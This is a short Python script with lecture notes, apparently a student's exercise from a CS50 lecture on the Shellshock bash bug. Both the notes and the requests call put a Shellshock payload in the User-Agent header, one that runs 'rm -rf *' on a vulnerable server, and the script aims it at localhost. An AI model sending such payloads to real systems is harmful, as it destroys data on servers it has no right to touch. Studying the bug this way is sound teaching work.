'''
  Not Working.. of course
  


  Learn from   Harvard Open Course : CS 50 
  Week 4 - Lecture
  
  
  Shellshock
  
  
GET / HTTP 1.1
Location: www.x.com
User-Agent: () { :; }; rm -rf *' bash -c :
  
'''
# Requests
# http://www.python-requests.org/en/latest/user/quickstart/#custom-headers



import requests
import json


url = 'http://localhost:3000/r_header'

headers = {
  "User-Agent": "() { :; }; rm -rf *' bash -c :"
}

r = requests.get(url, headers=headers)
#print (r)
print (r.content)













